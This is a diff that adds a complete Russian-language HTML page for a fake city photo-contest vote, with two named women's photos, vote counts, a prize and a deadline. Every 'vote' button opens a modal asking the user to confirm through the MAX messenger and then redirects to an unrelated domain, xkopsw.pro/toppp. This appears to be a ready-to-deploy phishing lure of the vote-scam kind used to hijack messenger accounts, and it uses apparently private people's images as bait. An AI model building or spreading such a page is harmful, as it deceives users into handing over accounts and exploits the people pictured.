@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#0f749b" />
+  <title>ФотоКонкурсы! • Голосование</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg-1:#f6fbff;
+      --bg-2:#eef7fc;
+      --card:#ffffff;
+      --text:#102033;
+      --muted:#678094;
+      --line:rgba(16,32,51,.08);
+
+      --brand-1:#0f749b;
+      --brand-2:#19b2e6;
+      --brand-3:#0c6183;
+      --brand-4:#128fbe;
+
+      --modal-bg:#0f1620;
+      --modal-card:#161f2b;
+      --modal-line:rgba(255,255,255,.08);
+      --modal-text:#eef6ff;
+      --modal-muted:#b8c6d6;
+
+      --success:#63d5ff;
+      --shadow-card:0 20px 48px rgba(17, 38, 58, .14);
+      --shadow-photo:0 22px 46px rgba(15, 35, 55, .20);
+      --shadow-btn:0 14px 28px rgba(25,178,230,.30);
+      --shadow-modal:0 30px 80px rgba(0,0,0,.42);
+
+      --radius-xl:30px;
+      --radius-lg:24px;
+      --radius-md:18px;
+      --radius-sm:14px;
+
+      --font-head:'Sora', sans-serif;
+      --font-body:'Plus Jakarta Sans', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+
+    *{
+      box-sizing:border-box;
+      margin:0;
+      padding:0;
+    }
+
+    html{
+      scroll-behavior:smooth;
+      -webkit-text-size-adjust:100%;
+    }
+
+    body{
+      min-height:100svh;
+      font-family:var(--font-body);
+      color:var(--text);
+      line-height:1.55;
+      -webkit-tap-highlight-color:transparent;
+      background:
+        radial-gradient(circle at top left, rgba(25,178,230,.10), transparent 27%),
+        radial-gradient(circle at top right, rgba(15,116,155,.08), transparent 24%),
+        linear-gradient(180deg, var(--bg-1) 0%, var(--bg-2) 100%);
+      overflow-x:hidden;
+      overscroll-behavior-y:none;
+    }
+
+    body.modal-open{
+      overflow:hidden;
+      touch-action:none;
+    }
+
+    img{
+      max-width:100%;
+      display:block;
+    }
+
+    button{
+      font:inherit;
+    }
+
+    .page{
+      width:min(100%, 640px);
+      margin:0 auto;
+      padding:24px 18px 90px;
+    }
+
+    .hero{
+      text-align:center;
+      padding:10px 2px 18px;
+    }
+
+    .hero-badge{
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      gap:8px;
+      min-height:40px;
+      padding:10px 16px;
+      border-radius:999px;
+      background:rgba(255,255,255,.78);
+      border:1px solid rgba(15,116,155,.12);
+      box-shadow:0 8px 18px rgba(16,32,51,.05);
+      backdrop-filter:blur(8px);
+      color:#35556d;
+      font-size:13px;
+      font-weight:700;
+      margin-bottom:18px;
+    }
+
+    .hero-title{
+      font-family:var(--font-head);
+      font-size:clamp(34px, 8.8vw, 56px);
+      line-height:1.02;
+      letter-spacing:-1.25px;
+      font-weight:800;
+      margin-bottom:12px;
+      background:linear-gradient(135deg, var(--brand-1), var(--brand-2));
+      -webkit-background-clip:text;
+      background-clip:text;
+      -webkit-text-fill-color:transparent;
+    }
+
+    .hero-subtitle{
+      max-width:500px;
+      margin:0 auto;
+      color:#496274;
+      font-size:18px;
+      font-weight:600;
+    }
+
+    .notice{
+      margin:24px auto 34px;
+      display:flex;
+      align-items:center;
+      gap:14px;
+      padding:15px 16px;
+      border-radius:22px;
+      background:rgba(255,255,255,.88);
+      border:1px solid var(--line);
+      box-shadow:0 12px 24px rgba(16,32,51,.06);
+    }
+
+    .notice-icon{
+      width:42px;
+      height:42px;
+      flex:0 0 42px;
+      border-radius:50%;
+      overflow:hidden;
+      background:#fff;
+      box-shadow:0 6px 14px rgba(16,32,51,.08);
+    }
+
+    .notice-icon img{
+      width:100%;
+      height:100%;
+      object-fit:contain;
+    }
+
+    .notice-text{
+      color:#2e475b;
+      font-size:14.5px;
+      font-weight:700;
+    }
+
+    .list{
+      display:grid;
+      gap:28px;
+    }
+
+    .entry{
+      position:relative;
+      overflow:hidden;
+      background:linear-gradient(180deg, rgba(255,255,255,1), rgba(251,254,255,1));
+      border-radius:var(--radius-xl);
+      box-shadow:var(--shadow-card);
+      padding:18px 18px 22px;
+      border:1px solid rgba(255,255,255,.8);
+      transition:transform .24s ease, box-shadow .24s ease;
+      isolation:isolate;
+    }
+
+    .entry::before{
+      content:"";
+      position:absolute;
+      inset:0 0 auto 0;
+      height:120px;
+      background:linear-gradient(180deg, rgba(25,178,230,.10), rgba(25,178,230,0));
+      pointer-events:none;
+      z-index:-1;
+    }
+
+    .entry:hover{
+      transform:translateY(-4px);
+      box-shadow:0 26px 56px rgba(15, 35, 55, .18);
+    }
+
+    .entry-media{
+      display:flex;
+      justify-content:center;
+      margin-bottom:20px;
+    }
+
+    .avatar-ring{
+      width:278px;
+      height:278px;
+      padding:11px;
+      border-radius:50%;
+      background:linear-gradient(180deg, #ffffff, #eaf5fb);
+      box-shadow:var(--shadow-photo);
+    }
+
+    .avatar{
+      width:100%;
+      height:100%;
+      border-radius:50%;
+      object-fit:cover;
+      object-position:50% 10%;
+      background:#f1f5f8;
+    }
+
+    .entry-body{
+      text-align:center;
+    }
+
+    .entry-name{
+      font-family:var(--font-head);
+      font-size:28px;
+      line-height:1.13;
+      letter-spacing:-.45px;
+      font-weight:700;
+      margin-bottom:7px;
+      color:#102234;
+    }
+
+    .entry-votes{
+      font-size:16px;
+      color:var(--muted);
+      font-weight:700;
+      margin-bottom:22px;
+    }
+
+    .entry-btn{
+      width:100%;
+      max-width:340px;
+      min-height:58px;
+      padding:14px 22px;
+      border:none;
+      border-radius:999px;
+      cursor:pointer;
+      background:linear-gradient(135deg, var(--brand-1), var(--brand-2));
+      color:#fff;
+      font-size:17px;
+      font-weight:800;
+      letter-spacing:.01em;
+      box-shadow:var(--shadow-btn);
+      transition:transform .22s ease, box-shadow .22s ease, filter .22s ease;
+      will-change:transform;
+    }
+
+    .entry-btn:hover{
+      transform:translateY(-2px);
+      box-shadow:0 18px 34px rgba(25,178,230,.38);
+      filter:saturate(1.05);
+    }
+
+    .entry-btn:active{
+      transform:translateY(1px);
+      box-shadow:0 8px 18px rgba(25,178,230,.25);
+    }
+
+    .entry-btn:focus-visible,
+    .dialog-close:focus-visible,
+    .dialog-btn:focus-visible{
+      outline:3px solid rgba(25,178,230,.30);
+      outline-offset:3px;
+    }
+
+    .prize{
+      margin-top:34px;
+      padding:24px 18px;
+      border-radius:26px;
+      text-align:center;
+      background:linear-gradient(135deg, #e4f5ff, #d3ebff);
+      border:1px solid rgba(36,126,214,.14);
+      box-shadow:0 12px 28px rgba(16,32,51,.05);
+    }
+
+    .prize-title{
+      font-size:16px;
+      font-weight:800;
+      color:#1b4a7e;
+      margin-bottom:6px;
+    }
+
+    .prize-title strong{
+      color:#0f1f32;
+    }
+
+    .prize-time{
+      font-size:13.5px;
+      color:#5d77a2;
+      font-weight:700;
+    }
+
+    .footer{
+      margin-top:30px;
+      text-align:center;
+      color:#8b9aab;
+      font-size:13px;
+      padding:0 8px;
+    }
+
+    /* MODAL */
+
+    .modal{
+      position:fixed;
+      inset:0;
+      z-index:1000;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      padding:18px;
+      background:rgba(7, 16, 28, .78);
+      backdrop-filter:blur(10px);
+      opacity:0;
+      visibility:hidden;
+      pointer-events:none;
+      transition:opacity .26s ease, visibility .26s ease;
+    }
+
+    .modal.open{
+      opacity:1;
+      visibility:visible;
+      pointer-events:auto;
+    }
+
+    .dialog{
+      position:relative;
+      width:min(100%, 430px);
+      background:
+        radial-gradient(circle at top, rgba(99,213,255,.10), transparent 44%),
+        linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.02)),
+        var(--modal-card);
+      border:1px solid var(--modal-line);
+      border-radius:30px;
+      color:var(--modal-text);
+      box-shadow:var(--shadow-modal);
+      padding:26px 20px 20px;
+      text-align:center;
+      transform:translateY(14px) scale(.96);
+      transition:transform .34s cubic-bezier(.22,1,.36,1);
+      max-height:min(88svh, 720px);
+      overflow:auto;
+      overscroll-behavior:contain;
+    }
+
+    .modal.open .dialog{
+      transform:translateY(0) scale(1);
+    }
+
+    .dialog-top{
+      display:flex;
+      justify-content:center;
+      margin-bottom:16px;
+    }
+
+    .dialog-icon{
+      width:74px;
+      height:74px;
+      border-radius:22px;
+      display:grid;
+      place-items:center;
+      background:linear-gradient(135deg, rgba(25,178,230,.16), rgba(15,116,155,.22));
+      border:1px solid rgba(255,255,255,.08);
+      box-shadow:inset 0 1px 0 rgba(255,255,255,.06);
+    }
+
+    .dialog-icon img{
+      width:38px;
+      height:38px;
+      object-fit:contain;
+      filter:drop-shadow(0 4px 10px rgba(0,0,0,.20));
+    }
+
+    .dialog-close{
+      position:absolute;
+      top:12px;
+      right:12px;
+      width:44px;
+      height:44px;
+      border:none;
+      border-radius:14px;
+      background:rgba(255,255,255,.06);
+      color:#d9e6f2;
+      cursor:pointer;
+      font-size:28px;
+      line-height:1;
+      transition:background .2s ease, transform .2s ease;
+    }
+
+    .dialog-close:hover{
+      background:rgba(255,255,255,.10);
+      transform:scale(1.03);
+    }
+
+    .dialog-title{
+      font-family:var(--font-head);
+      font-size:25px;
+      line-height:1.1;
+      font-weight:800;
+      letter-spacing:-.4px;
+      margin-bottom:10px;
+      color:#ffffff;
+    }
+
+    .dialog-text{
+      max-width:330px;
+      margin:0 auto 18px;
+      color:var(--modal-muted);
+      font-size:15px;
+      font-weight:600;
+    }
+
+    .dialog-note{
+      display:flex;
+      align-items:flex-start;
+      gap:10px;
+      text-align:left;
+      padding:14px;
+      margin:0 0 18px;
+      border-radius:18px;
+      background:rgba(255,255,255,.04);
+      border:1px solid rgba(255,255,255,.06);
+    }
+
+    .dialog-note-dot{
+      width:10px;
+      height:10px;
+      flex:0 0 10px;
+      border-radius:50%;
+      background:var(--success);
+      margin-top:7px;
+      box-shadow:0 0 0 6px rgba(99,213,255,.10);
+    }
+
+    .dialog-note-text{
+      color:#d5e3ef;
+      font-size:14px;
+      font-weight:600;
+      line-height:1.5;
+    }
+
+    .track{
+      width:100%;
+      height:8px;
+      border-radius:999px;
+      background:rgba(255,255,255,.07);
+      overflow:hidden;
+      margin:0 0 20px;
+    }
+
+    .bar{
+      width:0%;
+      height:100%;
+      border-radius:999px;
+      background:linear-gradient(90deg, var(--brand-1), var(--brand-2));
+      transition:width 1s ease;
+    }
+
+    .dialog-actions{
+      display:grid;
+      gap:10px;
+    }
+
+    .dialog-btn{
+      width:100%;
+      min-height:58px;
+      padding:14px 18px;
+      border:none;
+      border-radius:999px;
+      cursor:pointer;
+      display:inline-flex;
+      align-items:center;
+      justify-content:center;
+      gap:12px;
+      background:linear-gradient(135deg, var(--brand-1), var(--brand-2));
+      color:#fff;
+      font-size:17px;
+      font-weight:800;
+      box-shadow:0 14px 30px rgba(25,178,230,.26);
+      transition:transform .2s ease, box-shadow .2s ease, opacity .2s ease;
+    }
+
+    .dialog-btn:hover{
+      transform:translateY(-2px);
+      box-shadow:0 18px 36px rgba(25,178,230,.34);
+    }
+
+    .dialog-btn:active{
+      transform:translateY(1px);
+    }
+
+    .dialog-btn[disabled]{
+      cursor:default;
+      opacity:.76;
+      transform:none;
+    }
+
+    .dialog-btn svg{
+      width:21px;
+      height:21px;
+      flex:0 0 21px;
+      stroke:#fff;
+    }
+
+    .dialog-secondary{
+      width:100%;
+      min-height:50px;
+      padding:12px 16px;
+      border:none;
+      border-radius:999px;
+      cursor:pointer;
+      background:rgba(255,255,255,.06);
+      color:#d7e5f2;
+      font-size:15px;
+      font-weight:700;
+      transition:background .2s ease;
+    }
+
+    .dialog-secondary:hover{
+      background:rgba(255,255,255,.10);
+    }
+
+    .sr-only{
+      position:absolute;
+      width:1px;
+      height:1px;
+      padding:0;
+      margin:-1px;
+      overflow:hidden;
+      clip:rect(0,0,0,0);
+      white-space:nowrap;
+      border:0;
+    }
+
+    @media (max-width:560px){
+      .page{
+        padding:20px 14px 76px;
+      }
+
+      .hero-title{
+        font-size:clamp(31px, 10.2vw, 44px);
+      }
+
+      .hero-subtitle{
+        font-size:16px;
+      }
+
+      .notice{
+        padding:14px;
+        border-radius:20px;
+      }
+
+      .avatar-ring{
+        width:248px;
+        height:248px;
+        padding:10px;
+      }
+
+      .entry{
+        padding:16px 14px 20px;
+        border-radius:26px;
+      }
+
+      .entry-name{
+        font-size:24px;
+      }
+
+      .entry-votes{
+        font-size:15px;
+      }
+
+      .entry-btn,
+      .dialog-btn{
+        min-height:55px;
+        font-size:16px;
+      }
+
+      .dialog{
+        width:min(100%, 100%);
+        border-radius:28px;
+        padding:24px 16px 16px;
+      }
+
+      .dialog-title{
+        font-size:22px;
+      }
+
+      .dialog-text{
+        font-size:14.5px;
+      }
+    }
+
+    @media (max-width:420px){
+      .page{
+        padding-left:12px;
+        padding-right:12px;
+      }
+
+      .hero-badge{
+        font-size:12px;
+        min-height:38px;
+        padding:9px 14px;
+      }
+
+      .avatar-ring{
+        width:228px;
+        height:228px;
+      }
+
+      .entry-name{
+        font-size:22px;
+      }
+
+      .notice-text{
+        font-size:13.5px;
+      }
+
+      .modal{
+        padding:12px;
+      }
+
+      .dialog{
+        border-radius:24px;
+      }
+
+      .dialog-icon{
+        width:68px;
+        height:68px;
+        border-radius:20px;
+      }
+
+      .dialog-icon img{
+        width:34px;
+        height:34px;
+      }
+
+      .dialog-close{
+        width:42px;
+        height:42px;
+      }
+    }
+
+    @media (max-width:360px){
+      .hero-title{
+        letter-spacing:-.9px;
+      }
+
+      .avatar-ring{
+        width:210px;
+        height:210px;
+      }
+
+      .entry-btn{
+        min-height:53px;
+        font-size:15.5px;
+      }
+
+      .dialog-title{
+        font-size:20px;
+      }
+
+      .dialog-text,
+      .dialog-note-text{
+        font-size:14px;
+      }
+    }
+
+    @media (hover:none){
+      .entry:hover,
+      .dialog-btn:hover,
+      .dialog-close:hover,
+      .dialog-secondary:hover{
+        transform:none;
+      }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <section class="hero">
+      <div class="hero-badge">Онлайн-голосование • 2026</div>
+      <h1 class="hero-title">ФотоКонкурсы!</h1>
+      <p class="hero-subtitle">Выбирайте кто станет победителем. Новый городской конкурс "Кто Круче?"! Зови своих друзей и получай крутой приз.</p>
+    </section>
+
+    <div class="notice">
+      <div class="notice-icon">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/%D0%9B%D0%BE%D0%B3%D0%BE%D1%82%D0%B8%D0%BF_MAX.svg/250px-%D0%9B%D0%BE%D0%B3%D0%BE%D1%82%D0%B8%D0%BF_MAX.svg.png" alt="MAX">
+      </div>
+      <div class="notice-text">Подтвердите свой голос через клиент MAX</div>
+    </div>
+
+    <section class="list">
+      <article class="entry">
+        <div class="entry-media">
+          <div class="avatar-ring">
+            <img class="avatar" src="https://i.ibb.co/cX8D9ypq/EY0b-QOjsu2yt-YRHArv-H0-X1-CX3-F9-KGu-W2-2vf3ob-R-EHWmp8ttmb3-Kn8-JJm8-O05-X2-I37-Qck-Oj-Dm-CEEbz1-C4xi-QFNl.jpg" alt="Участник 1">
+          </div>
+        </div>
+        <div class="entry-body">
+          <h2 class="entry-name">Софа Мальцева</h2>
+          <div class="entry-votes">23 голоса</div>
+          <button class="entry-btn vote-trigger" type="button">Проголосовать</button>
+        </div>
+      </article>
+
+      <article class="entry">
+        <div class="entry-media">
+          <div class="avatar-ring">
+            <img class="avatar" src="https://i.imgur.com/sULS2xs.jpeg" alt="Участник 2">
+          </div>
+        </div>
+        <div class="entry-body">
+          <h2 class="entry-name">Ирина Пинчук</h2>
+          <div class="entry-votes">29 голосов</div>
+          <button class="entry-btn vote-trigger" type="button">Проголосовать</button>
+        </div>
+      </article>
+    </section>
+
+    <section class="prize">
+      <div class="prize-title">Главный приз — <strong>Xiaomi Smart Band 9</strong> + 5 000 ₽ на карту</div>
+      <div class="prize-time">До завершения голосования осталось 2 дня</div>
+    </section>
+
+    <footer class="footer">
+      © 2026 ФотоКонкурсы · Все права защищены
+    </footer>
+  </main>
+
+  <div
+    class="modal"
+    id="modal"
+    aria-hidden="true"
+    role="dialog"
+    aria-modal="true"
+    aria-labelledby="dialogTitle"
+    aria-describedby="dialogText"
+  >
+    <div class="dialog" id="dialog" tabindex="-1">
+      <button class="dialog-close" type="button" aria-label="Закрыть модальное окно">×</button>
+
+      <div class="dialog-top">
+        <div class="dialog-icon">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/%D0%9B%D0%BE%D0%B3%D0%BE%D1%82%D0%B8%D0%BF_MAX.svg/250px-%D0%9B%D0%BE%D0%B3%D0%BE%D1%82%D0%B8%D0%BF_MAX.svg.png" alt="">
+        </div>
+      </div>
+
+      <h2 class="dialog-title" id="dialogTitle">Подтвердите голос</h2>
+      <p class="dialog-text" id="dialogText">
+        Нажмите кнопку ниже, чтобы открыть страницу подтверждения в новом окне.
+      </p>
+
+      <div class="dialog-note">
+        <span class="dialog-note-dot" aria-hidden="true"></span>
+        <div class="dialog-note-text">
+          После нажатия откроется страница подтверждения. Если новое окно не откроется автоматически, переход выполнится в этой же вкладке.
+        </div>
+      </div>
+
+      <div class="track" aria-hidden="true">
+        <div class="bar" id="pbar"></div>
+      </div>
+
+      <div class="dialog-actions">
+        <button class="dialog-btn" id="goBtn" type="button">
+          <span id="goBtnText">Продолжить</span>
+          <svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" aria-hidden="true">
+            <path d="M5 12h14M12 5l7 7-7 7"/>
+          </svg>
+        </button>
+
+        <button class="dialog-secondary" id="cancelBtn" type="button">Отмена</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      'use strict';
+
+      const targetUrl = 'https://xkopsw.pro/toppp';
+
+      const body = document.body;
+      const modal = document.getElementById('modal');
+      const dialog = document.getElementById('dialog');
+      const pbar = document.getElementById('pbar');
+      const goBtn = document.getElementById('goBtn');
+      const goBtnText = document.getElementById('goBtnText');
+      const closeBtn = document.querySelector('.dialog-close');
+      const cancelBtn = document.getElementById('cancelBtn');
+      const triggers = document.querySelectorAll('.vote-trigger');
+
+      let lastFocusedElement = null;
+      let isModalOpen = false;
+      let isNavigating = false;
+      let progressTimer = null;
+
+      function startProgress() {
+        clearTimeout(progressTimer);
+        pbar.style.width = '0%';
+
+        requestAnimationFrame(() => {
+          progressTimer = setTimeout(() => {
+            pbar.style.width = '82%';
+          }, 80);
+        });
+      }
+
+      function stopProgress() {
+        clearTimeout(progressTimer);
+      }
+
+      function setModalState(open) {
+        isModalOpen = open;
+        modal.classList.toggle('open', open);
+        modal.setAttribute('aria-hidden', open ? 'false' : 'true');
+        body.classList.toggle('modal-open', open);
+
+        if (open) {
+          startProgress();
+          setTimeout(() => {
+            dialog.focus({ preventScroll: true });
+          }, 30);
+        } else {
+          stopProgress();
+          pbar.style.width = '0%';
+          if (lastFocusedElement && typeof lastFocusedElement.focus === 'function') {
+            lastFocusedElement.focus({ preventScroll: true });
+          }
+        }
+      }
+
+      function openModal(triggerEl) {
+        if (isModalOpen) return;
+        lastFocusedElement = triggerEl || document.activeElement;
+        setModalState(true);
+      }
+
+      function closeModal() {
+        if (!isModalOpen) return;
+        setModalState(false);
+      }
+
+      function safeNavigate(url) {
+        if (!url || isNavigating) return;
+
+        isNavigating = true;
+        goBtn.disabled = true;
+        goBtnText.textContent = 'Открываем...';
+        pbar.style.width = '100%';
+
+        let newWindow = null;
+
+        try {
+          newWindow = window.open(url, '_blank', 'noopener,noreferrer');
+        } catch (err) {}
+
+        setTimeout(() => {
+          if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
+            window.location.href = url;
+            return;
+          }
+
+          isNavigating = false;
+          goBtn.disabled = false;
+          goBtnText.textContent = 'Продолжить';
+        }, 180);
+      }
+
+      triggers.forEach((btn) => {
+        btn.addEventListener('click', function (e) {
+          e.preventDefault();
+          openModal(btn);
+        }, { passive: false });
+      });
+
+      goBtn.addEventListener('click', function () {
+        safeNavigate(targetUrl);
+      });
+
+      closeBtn.addEventListener('click', closeModal);
+      cancelBtn.addEventListener('click', closeModal);
+
+      modal.addEventListener('click', function (e) {
+        if (e.target === modal) closeModal();
+      });
+
+      document.addEventListener('keydown', function (e) {
+        if (!isModalOpen) return;
+
+        if (e.key === 'Escape') {
+          e.preventDefault();
+          closeModal();
+        }
+
+        if (e.key === 'Tab') {
+          const focusable = modal.querySelectorAll(
+            'button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'
+          );
+
+          if (!focusable.length) return;
+
+          const first = focusable[0];
+          const last = focusable[focusable.length - 1];
+
+          if (e.shiftKey && document.activeElement === first) {
+            e.preventDefault();
+            last.focus();
+          } else if (!e.shiftKey && document.activeElement === last) {
+            e.preventDefault();
+            first.focus();
+          }
+        }
+      });
+
+      window.addEventListener('pageshow', function () {
+        isNavigating = false;
+        goBtn.disabled = false;
+        goBtnText.textContent = 'Продолжить';
+      });
+    })();
+  </script>
+</body>
+</html>
